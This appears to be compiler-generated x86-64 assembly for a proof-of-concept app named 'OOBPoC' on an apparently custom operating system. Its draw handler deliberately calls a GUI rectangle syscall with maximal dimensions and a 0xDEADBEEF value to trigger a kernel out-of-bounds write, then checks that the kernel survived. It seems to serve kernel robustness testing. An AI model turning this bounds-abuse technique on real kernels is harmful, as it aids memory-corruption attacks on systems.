; NexusHL generated — do not edit by hand
; app="OOBPoC" stack=4096
global app_hl_poc_oob_poc_draw
app_hl_poc_oob_poc_draw:
    push rbp
    mov rbp, rsp
    sub rsp, 512
    mov [rbp-8], rdi
    push rbx
    push r12
    mov rax, 24
    push rax
    mov rax, 24
    push rax
    lea rax, [rel app_hl_poc_oob_s_title]
    push rax
    mov rax, 16777215
    push rax
    mov rax, 0
    push rax
    pop r8
    pop r10
    pop rdx
    pop rsi
    pop rdi
    mov rax, 3
    syscall
    lea rax, [rel app_hl_poc_oob_s_pre]
    push rax
    pop rdi
    mov rax, 0
    syscall
    mov rax, 2147483647
    push rax
    mov rax, 2147483647
    push rax
    mov rax, 1
    push rax
    mov rax, 1
    push rax
    mov rax, 3735928559
    push rax
    pop r8
    pop r10
    pop rdx
    pop rsi
    pop rdi
    mov rax, 2
    syscall
    lea rax, [rel app_hl_poc_oob_s_post_ok]
    push rax
    pop rdi
    mov rax, 0
    syscall
.fn_end_0_app_hl_poc_oob_poc_draw:
    pop r12
    pop rbx
    mov rsp, rbp
    pop rbp
    ret
global app_hl_poc_oob_poc_click
app_hl_poc_oob_poc_click:
    push rbp
    mov rbp, rsp
    sub rsp, 512
    mov [rbp-8], rdi
    mov [rbp-16], rsi
    mov [rbp-24], rdx
    push rbx
    push r12
.fn_end_0_app_hl_poc_oob_poc_click:
    pop r12
    pop rbx
    mov rsp, rbp
    pop rbp
    ret
global app_hl_poc_oob_poc_key
app_hl_poc_oob_poc_key:
    push rbp
    mov rbp, rsp
    sub rsp, 512
    mov [rbp-8], rdi
    mov [rbp-16], rsi
    push rbx
    push r12
.fn_end_0_app_hl_poc_oob_poc_key:
    pop r12
    pop rbx
    mov rsp, rbp
    pop rbp
    ret
app_hl_poc_oob_s_title: db "OOB-PoC", 0
app_hl_poc_oob_s_pre: db "[poc] firing gui_rect OOB write", 0
app_hl_poc_oob_s_post_ok: db "[poc] syscall returned - kernel survived", 0
